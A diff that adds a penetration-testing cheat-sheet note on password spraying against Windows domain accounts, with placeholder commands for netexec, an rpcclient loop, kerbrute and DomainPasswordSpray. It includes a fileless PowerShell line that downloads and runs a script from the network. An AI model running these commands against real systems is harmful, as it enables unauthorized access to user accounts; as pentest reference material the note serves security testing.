@@ -1,0 +1,101 @@
+---
+Primary_category: "[[WINDOWS CREDENTIALS BRUTEFORCING]]"
+title: "PASSWORD SPRAYING"
+draft: false
+banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
+banner_y: 0.88286
+tags:
+cssclasses:
+---
+
+###### PRIMARY CATEGORY → [[WINDOWS CREDENTIALS BRUTEFORCING]]
+
+#### *Theory*
+
+This technique consists of carrying out a set of logon attempts against a remote target through a certain protocol, such as *SMB* or *RPC*, by providing a user list and a single password as input data
+
+It is always mandatory, before proceed with these type of attacks, to glean information about the *[[WINDOWS PASSWORD POLICY|Domain Password Policy]]* in order to prevent locking any domain user account
+
+---
+
+#### *Spraying from Linux*
+
+##### *Netexec*
+
+> ***[Netexec](https://github.com/Pennyw0rth/NetExec)***
+
+- ***Domain Level***
+
+```bash
+nxc <PROTOCOL> <TARGET> --username <USER_LIST> --password '<PASSWD>'
+```
+
+- ***Local Level***
+
+```bash
+nxc <PROTOCOL> <TARGET> --username <USER_LIST> --password '<PASSWD>' --local-auth
+```
+
+##### *RPCclient*
+
+> ***[RPCclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)***
+
+```bash
+while IFS= read -r _user ; do rpcclient --user "${_user}%<PASSWD>" --command 'getusername ; quit' <TARGET> ; done < ./<USER_LIST> |& awk -v IGNORECASE=1 '/authority/ { gsub(/,/,"") ; print $3 }'
+```
+
+##### *Kerbrute*
+
+> ***[Kerbrute](https://github.com/ropnop/kerbrute)***
+
+```bash
+kerbrute passwordspray --dc <TARGET> --domain <DOMAIN> <USER_LIST> '<PASSWD>'
+```
+
+---
+
+#### *Spraying from Windows*
+
+##### *DomainPasswordSpray*
+
+> ***[DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)***
+
+###### *Setup*
+
+- ***Fileless***
+
+```bash
+IEX (New-Object Net.WebClient).downloadString('https://github.com/dafthack/DomainPasswordSpray/raw/refs/heads/master/DomainPasswordSpray.ps1')
+```
+
+- ***Importing Powershell Module***
+
+```bash
+IWR -UseBasicParsing -Uri 'https://github.com/dafthack/DomainPasswordSpray/raw/refs/heads/master/DomainPasswordSpray.ps1' -OutFile '.\DomainPasswordSpray.ps1'
+```
+
+```bash
+Import-Module .\DomainPasswordSpray.ps1
+```
+
+###### *Usage*
+
+When executed on a domain-joined host, this tool automatically gathers all domain user accounts. Therefore, there is no need to specify a valid user list
+
+- ***W/O Userlist + Password***
+
+```bash
+Invoke-DomainPasswordSpray -Password '<PASSWD>' -OutFile <OUTPUT_FILE> -ErrorAction SilentlyContinue
+```
+
+- ***Userlist provided + Password***
+
+```bash
+Invoke-DomainPasswordSpray -UserList <USER_LIST> -Domain <DOMAIN> -Password '<PASSWD>' -OutFile <OUTPUT_FILE> -ErrorAction SilentlyContinue
+```
+
+- ***Userlist provided + Set of Passwords***
+
+```bash
+Invoke-DomainPasswordSpray -UserList <USER_LIST> -Domain <DOMAIN> -PasswordList '<PASSWD>' -OutFile <OUTPUT_FILE> -ErrorAction SilentlyContinue
+```
